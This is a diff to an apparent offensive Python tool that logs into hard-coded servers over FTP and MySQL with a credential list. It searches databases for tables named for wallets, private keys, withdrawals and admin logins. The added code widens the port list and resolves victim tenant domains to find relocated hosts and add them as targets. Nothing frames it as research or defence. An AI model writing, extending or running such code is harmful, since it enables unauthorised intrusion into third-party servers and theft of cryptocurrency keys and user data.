@@ -1,7 +1,7 @@
 import os, socket, base64, json, zlib, re, sys, time, hashlib, io
 
 HOSTS = ["103.20.215.96", "103.20.213.118", "103.20.214.68", "103.20.214.150"]
-PORTS = [21, 3306, 80, 443, 8443]
+PORTS = [21, 3306, 3307, 80, 443, 8443]
 WHITE = ["0xdfc072ec43415d445b669b5cbe59957ae3abf063",
          "0xef9a04b2d2e27e0109458774ff9100670d79c07a"]
 SHARED = ["ferryinfotech", "bncet", "bncet343423", "sfdashfklhjafkla"]
@@ -16,7 +16,7 @@ except Exception as e:
     print("RUNNER_IP_FAIL", e, flush=True)
 
 
-def tcp(h, p, t=8):
+def tcp(h, p, t=5):
     s = socket.socket()
     s.settimeout(t)
     try:
@@ -141,7 +141,7 @@ def scan_value(val, src):
 # ---------------- FTP ----------------
 def ftp_phase():
     import ftplib
-    for h in HOSTS:
+    for h in list(HOSTS):
         if not reach.get((h, 21)):
             continue
         mine = [c for c in creds if c["host"].strip() == h and c["ftp_user"].strip()]
@@ -185,7 +185,7 @@ def mysql_phase():
         print("NO_PYMYSQL", e, flush=True)
         return
     tables_re = re.compile(r"(?i)(setconfig|wallet|address|pvt|priv|key|withdraw|gateway|config|holders|raw_data|admin_login|member|user_detail|tr_userbsc)")
-    for h in HOSTS:
+    for h in list(HOSTS):
         if not reach.get((h, 3306)):
             continue
         mine = [c for c in creds if c["host"].strip() == h and c["db_user"].strip()]
@@ -249,6 +249,29 @@ def mysql_phase():
                     pass
             if got >= 12:
                 break
+
+# ---- DNS: tenant domains may now resolve to moved hosts ----
+print("=== DNS PHASE ===", flush=True)
+try:
+    doms = sorted({(c.get("domain") or "").strip().lower() for c in creds if (c.get("domain") or "").strip()})
+    newips = {}
+    for d in doms[:260]:
+        try:
+            for ip in socket.gethostbyname_ex(d)[2]:
+                if ip not in HOSTS:
+                    newips.setdefault(ip, []).append(d)
+        except Exception:
+            pass
+    print("RESOLVED_ALT_IPS", len(newips), flush=True)
+    for ip in list(newips)[:80]:
+        o21 = tcp(ip, 21, 4); o33 = tcp(ip, 3306, 4)
+        print("ALT %s domains=%s 21=%s 3306=%s" % (ip, newips[ip][:3], o21, o33), flush=True)
+        if o21: reach[(ip, 21)] = True
+        if o33: reach[(ip, 3306)] = True
+    for ip in newips:
+        if ip not in HOSTS: HOSTS.append(ip)
+except Exception as e:
+    print("DNS_ERR", e, flush=True)
 
 ftp_phase()
 mysql_phase()
